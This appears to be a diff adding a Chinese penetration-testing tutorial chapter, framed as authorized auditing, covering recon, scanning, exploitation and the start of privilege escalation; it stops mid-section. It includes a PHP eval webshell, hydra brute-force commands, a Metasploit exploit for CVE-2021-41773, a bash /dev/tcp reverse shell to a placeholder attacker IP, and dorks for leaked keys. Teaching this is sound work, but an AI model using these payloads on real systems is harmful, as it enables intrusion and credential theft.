+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能用 nmap 扫描端口并识别服务版本（04§2）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道 SQL 注入的基本手法（06§2）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 知道 TCP 和 HTTP 的基本概念（04§2、04§4）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能在 Linux 终端里自如操作（cd/ls/cat/nc/find/grep）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 了解密码哈希是什么概念（05§3）</li>
+</ul>
+<blockquote>
+<p>如果装了 Kali Linux 虚拟机最好——但用任何 Linux 都行。</p>
+</blockquote>
+<hr />
+<h2 id="_2">📊 本章进度<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>知识点</th>
+<th style="text-align: center;">预计用时</th>
+<th style="text-align: center;">状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>8.1</td>
+<td>渗透测试标准流程</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.2</td>
+<td>📌 信息收集——踩点与侦察</td>
+<td style="text-align: center;">60 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.3</td>
+<td>漏洞扫描——自动化发现弱点</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.4</td>
+<td>漏洞利用——拿下 shell</td>
+<td style="text-align: center;">60 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.5</td>
+<td>📌 提权技术——从普通用户到 root</td>
+<td style="text-align: center;">60 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.6</td>
+<td>后渗透与横向移动</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.7</td>
+<td>🧪 DC-1 靶机全程跟做</td>
+<td style="text-align: center;">90 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+<tr>
+<td>8.8</td>
+<td>写好渗透报告</td>
+<td style="text-align: center;">30 分钟</td>
+<td style="text-align: center;">⬜</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="1">1. 渗透测试标准流程<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
+<h3 id="_3">🏪 生活场景：安保公司做银行安全检查<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>一家银行雇了你的安保公司来做安全审计。你的工作不是抢银行——而是<strong>找到银行的安全漏洞，告诉银行怎么修</strong>。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>阶段 1: 踩点（Reconnaissance）
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>  银行有几栋楼？几个入口？保安几点换班？
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  → 信息收集——不碰目标，先看清楚
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>阶段 2: 扫描（Scanning）
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>  哪个窗户没锁？摄像头看哪个角度？
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>  → 用工具探测，验证猜想
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>阶段 3: 突破（Exploitation）
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>  翻窗进去——但要小心不触发警报
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>  → 漏洞利用，获取初始访问
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>阶段 4: 站稳（Post-exploitation）
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>  在里面找个地方躲起来（建立持久访问）
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>  找找这层楼还有什么房间（信息收集第二轮）
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>  找到通往金库的通道（提权）
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>阶段 5: 报告（Reporting）
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>  告诉银行：你的窗没锁、摄像头有死角、保安换班有空档
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>  附上修复建议
+</code></pre></div>
+<h3 id="_4">🔍 现实中的渗透测试标准<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌─────────────────────────────────────────────────┐
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>│              标准渗透测试五步法                      │
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>│                                                  │
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>│  ① 信息收集：能知道多少就知道多少                      │
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>│     确定攻击面——&quot;哪些地方可能出问题？&quot;                 │
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>│         ↓                                        │
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>│  ② 漏洞发现：找到具体可利用的弱点                      │
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>│     服务版本 → CVE → Exploit-DB 搜漏洞利用代码          │
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>│         ↓                                        │
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>│  ③ 漏洞利用：获得初始访问权                           │
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>│     webshell / reverse shell / SSH 密码             │
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>│         ↓                                        │
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>│  ④ 后渗透：扩大战果                                 │
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>│     提权（user → root）、信息收集（找密码）、横向移动       │
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>│         ↓                                        │
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>│  ⑤ 报告：产出文档                                   │
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>│     漏洞描述 + 复现步骤 + 危害评估 + 修复建议            │
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>└─────────────────────────────────────────────────┘
+</code></pre></div>
+<hr />
+<h2 id="2">2. 📌 信息收集——踩点与侦察<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>信息收集决定你能走多远。</strong> 你找不到洞，不是因为你不会打——是你信息蒐集不够。</p>
+</blockquote>
+<h3 id="21">2.1 被动信息收集（不直接接触目标）<a class="headerlink" href="#21" title="Permanent link">&para;</a></h3>
+<p><strong>Google Hacking（Google Dork）：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>site:target.com filetype:pdf        → 搜目标站上的 PDF 文档
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>site:target.com intitle:&quot;index of&quot;  → 开放目录浏览
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>site:target.com inurl:admin         → 管理后台入口
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>site:target.com ext:sql             → SQL 备份文件泄露！
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>site:target.com &quot;password&quot;          → 页面里有&quot;password&quot;关键词
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>site:target.com intext:&quot;@target.com&quot;  → 邮箱泄露
+</code></pre></div>
+<p><strong>Shodan（shodan.io）——搜索联网设备：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>搜索目标 IP 或域名段 → 看开放端口、服务版本、操作系统
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>  org:&quot;Target Corp&quot;  → 搜某公司的所有暴露设备
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>  port:22 &quot;SSH-2.0&quot;  → 搜全球开了 SSH 的设备
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>  product:&quot;Apache&quot; country:&quot;CN&quot; → 中国境内跑 Apache 的设备
+</code></pre></div>
+<p><strong>GitHub 搜索：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>site:github.com &quot;target.com&quot; password
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>site:github.com &quot;target.com&quot; &quot;api_key&quot;
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>site:github.com &quot;target.com&quot; &quot;BEGIN RSA PRIVATE KEY&quot;
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>→ 程序员不小心上传的密码和密钥！
+</code></pre></div>
+<p><strong>证书透明度日志（crt.sh）：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>crt.sh → 搜索 %.target.com
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>→ 所有 TLS 证书里出现过的子域名
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>→ 可能暴露内部系统: admin.target.com, dev.target.com, vpn.target.com
+</code></pre></div>
+<p><strong>Wayback Machine：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>web.archive.org → 搜索 target.com
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>→ 看历史版本的网站——旧版可能有没修的漏洞
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>→ robots.txt 旧版可能暴露了不想让搜索引擎爬的目录
+</code></pre></div>
+<h3 id="22">2.2 主动信息收集（接触目标）<a class="headerlink" href="#22" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># ===== 子域名枚举（子域名往往跑着没人在意的老系统） =====</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>subfinder<span class="w"> </span>-d<span class="w"> </span>target.com
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>amass<span class="w"> </span>enum<span class="w"> </span>-passive<span class="w"> </span>-d<span class="w"> </span>target.com
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># 或者在线: https://crt.sh</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># ===== 端口扫描 =====</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># 全端口快速扫描（先知道哪些端口开着）</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>nmap<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-oA<span class="w"> </span>nmap_allports<span class="w"> </span>target.com
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="c1"># -sS: SYN 半开扫描（快且不容易被日志记录）</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="c1"># -p-: 全部 65535 个端口</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c1"># --min-rate: 每秒至少发 10000 个包</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="c1"># 提取开放端口，做版本识别</span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>grep<span class="w"> </span><span class="s2">&quot;^[0-9]&quot;</span><span class="w"> </span>nmap_allports.nmap<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="k">)</span>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p<span class="w"> </span><span class="nv">$ports</span><span class="w"> </span>-oA<span class="w"> </span>nmap_services<span class="w"> </span>target.com
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="c1"># -sV: 版本识别</span>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="c1"># -sC: 默认脚本扫描</span>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="c1"># ===== 目录/文件枚举 =====</span>
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>php,txt,html,bak
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-e<span class="w"> </span>php,html,txt,bak,zip
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target.com/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="c1"># ===== 技术栈识别 =====</span>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>whatweb<span class="w"> </span>http://target.com
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="c1"># 输出: Apache[2.4.49], PHP[7.4.3], Bootstrap[4.5], jQuery[3.5]</span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="c1"># → 知道 Apache 2.4.49？马上查 CVE！</span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>wappalyzer<span class="w">  </span><span class="c1"># 浏览器插件，自动识别技术栈</span>
+</code></pre></div>
+<h3 id="_5">📋 信息收集清单<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>□ 主域名和所有子域名
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>□ 开放端口清单 + 服务 + 版本号
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>□ Web 技术栈（CMS/框架/语言/服务器/WAF/CDN）
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>□ 隐藏目录和文件（robots.txt/.git/backup/admin）
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>□ 注册人信息（whois → 姓名/邮箱/电话）
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>□ 关联 GitHub 仓库
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>□ SSL 证书 → 可能暴露内网域名
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>□ 历史网页（Wayback Machine）
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>□ Shodan/Censys/ZoomEye 搜索结果
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>□ 社交媒体（LinkedIn → 员工技术栈倾向）
+</code></pre></div>
+<hr />
+<h2 id="3">3. 漏洞扫描——自动化发现弱点<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># ===== nmap 漏洞脚本 =====</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>nmap<span class="w"> </span>--script<span class="w"> </span>vuln<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span>target.com
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># ===== Nikto —— Web 服务器扫描 =====</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>nikto<span class="w"> </span>-h<span class="w"> </span>http://target.com
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1"># ===== sqlmap —— SQL 注入自动化 =====</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c1"># 先手动判断是否存在注入（06§2），确认后用 sqlmap 自动化:</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/page.php?id=1&quot;</span><span class="w"> </span>--dbs
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="c1"># ===== searchsploit —— 根据版本号找公开漏洞 =====</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.49
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="c1"># → CVE-2021-41773 Apache 路径穿越 RCE</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">50383</span><span class="w">   </span><span class="c1"># 下载 exploit 脚本到本地</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="c1"># ===== Nessus（商业扫描器，有免费社区版）=====</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="c1"># 适合大范围扫描，但会有很多误报。</span>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="c1"># 扫描结果必须人工验证。</span>
+</code></pre></div>
+<p><strong>扫描原则：</strong> 自动化扫描器扫一遍 → 人工逐个验证 → 专注手动探索业务逻辑（这是工具永远发现不了的）。</p>
+<hr />
+<h2 id="4">4. 漏洞利用——拿下初始访问<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
+<h3 id="41">4.1 最常见的初始突破方式<a class="headerlink" href="#41" title="Permanent link">&para;</a></h3>
+<p><strong>① Web 漏洞拿 webshell（最常用）</strong></p>
+<p>文件上传 → 传一个 PHP 一句话木马：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<p>用蚁剑/冰蝎连接，获取 Web 服务器权限。</p>
+<p><strong>② 弱口令爆破</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># SSH</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ssh://target.com
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># FTP</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ftp://target.com
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="c1"># HTTP Basic Auth</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>rockyou.txt<span class="w"> </span>http-get://target.com/admin
+</code></pre></div>
+<p><strong>③ 公开 CVE 利用</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># 查到 Apache 2.4.49 → 搜 CVE</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.49
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># → CVE-2021-41773: 路径穿越 → 远程代码执行</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># 用 Metasploit</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>msfconsole
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.49
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/http/apache_normalize_path_rce
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span>target.com
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>msf6<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">80</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>msf6<span class="w"> </span>&gt;<span class="w"> </span>run
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="c1"># → 拿到 meterpreter shell</span>
+</code></pre></div>
+<h3 id="42-shell-shell">4.2 拿到初始 shell 后——升级为完整交互式 shell<a class="headerlink" href="#42-shell-shell" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># 你拿到的可能是 webshell、简陋的 nc shell——功能受限</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c1"># 第一步：反弹一个完整的 shell</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># 攻击机（你的 Kali Linux）:</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># 目标机（通过 webshell 或其他方式执行）:</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/你的IP/4444 0&gt;&amp;1&#39;</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="c1"># 收到连接后，升级为完整 TTY:</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="c1"># Ctrl+Z 把当前 nc 放后台</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="c1"># 现在你有了一个完整的交互式终端！</span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="c1"># 支持 Tab 补全、Ctrl+C、方向键、全屏编辑器</span>
+</code></pre></div>
+<hr />
+<h2 id="5-root">5. 📌 提权技术——从普通用户到 root<a class="headerlink" href="#5-root" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>拿到 www-data 不等于赢了。这个用户几乎什么都做不了。你需要提权到 root。</strong></p>
+</blockquote>
+<h3 id="ceo">🏪 生活场景：从大厅闯入 CEO 办公室<a class="headerlink" href="#ceo" title="Permanent link">&para;</a></h3>
+<p>你翻窗进了银行大厅（拿到 www-data shell）。现在大厅里你只能看看公共区域。你要找到去 CEO 办公室的路（提权到 root）。</p>
+<h3 id="51">5.1 上线后第一件事：信息收集<a class="headerlink" href="#51" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># === 你是谁？你在哪？ ===</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>id<span class="w">                   </span><span class="c1"># www-data uid=33</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>hostname<span class="w">                       </span><span class="c1"># 机器名</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>uname<span class="w"> </span>-a<span class="w">                       </span><span class="c1"># ★ 内核版本——找内核提权漏洞！</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c1"># === 这个系统什么配置？ ===</span>
